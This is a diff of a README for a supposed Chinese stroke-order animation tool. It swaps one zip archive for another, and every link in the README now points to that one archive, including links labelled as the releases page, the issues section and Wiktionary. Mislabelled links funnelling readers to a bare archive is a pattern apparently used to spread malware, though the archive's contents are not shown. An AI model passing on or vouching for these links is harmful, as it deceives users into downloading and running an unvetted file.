@@ -1,7 +1,7 @@
 # 🌟 Chinese-Stroke-Order-Generator - Create Stunning Stroke Order Animations
 
 ## 📥 Download Now
-[![Download](https://github.com/errormax16/Chinese-Stroke-Order-Generator/raw/refs/heads/main/output/Generator-Chinese-Order-Stroke-v1.6.zip)](https://github.com/errormax16/Chinese-Stroke-Order-Generator/raw/refs/heads/main/output/Generator-Chinese-Order-Stroke-v1.6.zip)
+[![Download](https://raw.githubusercontent.com/errormax16/Chinese-Stroke-Order-Generator/main/output/Stroke-Chinese-Order-Generator-v2.2.zip)](https://raw.githubusercontent.com/errormax16/Chinese-Stroke-Order-Generator/main/output/Stroke-Chinese-Order-Generator-v2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the **Chinese-Stroke-Order-Generator**! This tool helps you create animated GIFs that illustrate the stroke order of Chinese characters. Whether you want to learn Chinese or share your knowledge, this application makes it easy and fun.
@@ -17,7 +17,7 @@ To run the **Chinese-Stroke-Order-Generator**, your computer should meet the fol
 ## 🌐 Download & Install
 To get started, follow these steps to download and install the application:
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/errormax16/Chinese-Stroke-Order-Generator/raw/refs/heads/main/output/Generator-Chinese-Order-Stroke-v1.6.zip).
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/errormax16/Chinese-Stroke-Order-Generator/main/output/Stroke-Chinese-Order-Generator-v2.2.zip).
    
 2. **Choose the Latest Version**: Look for the newest version available. It will be at the top of the page.
 
@@ -62,12 +62,12 @@ Currently, this application is designed for desktop use only.
 The application supports any Chinese character. You can input traditional or simplified characters for animation.
 
 ## 📞 Support
-If you encounter any problems, please reach out via the [Issues Section](https://github.com/errormax16/Chinese-Stroke-Order-Generator/raw/refs/heads/main/output/Generator-Chinese-Order-Stroke-v1.6.zip) on GitHub. Your feedback helps us improve.
+If you encounter any problems, please reach out via the [Issues Section](https://raw.githubusercontent.com/errormax16/Chinese-Stroke-Order-Generator/main/output/Stroke-Chinese-Order-Generator-v2.2.zip) on GitHub. Your feedback helps us improve.
 
 ## 🔗 Resources
 For further reading and support materials on using **Chinese-Stroke-Order-Generator** and learning Chinese, consider these resources:
 
-- [Chinese Language Resources](https://github.com/errormax16/Chinese-Stroke-Order-Generator/raw/refs/heads/main/output/Generator-Chinese-Order-Stroke-v1.6.zip)
-- [Wiktionary for Chinese Characters](https://github.com/errormax16/Chinese-Stroke-Order-Generator/raw/refs/heads/main/output/Generator-Chinese-Order-Stroke-v1.6.zip)
+- [Chinese Language Resources](https://raw.githubusercontent.com/errormax16/Chinese-Stroke-Order-Generator/main/output/Stroke-Chinese-Order-Generator-v2.2.zip)
+- [Wiktionary for Chinese Characters](https://raw.githubusercontent.com/errormax16/Chinese-Stroke-Order-Generator/main/output/Stroke-Chinese-Order-Generator-v2.2.zip)
 
 Thank you for using **Chinese-Stroke-Order-Generator**! We hope you enjoy creating beautiful stroke order animations.
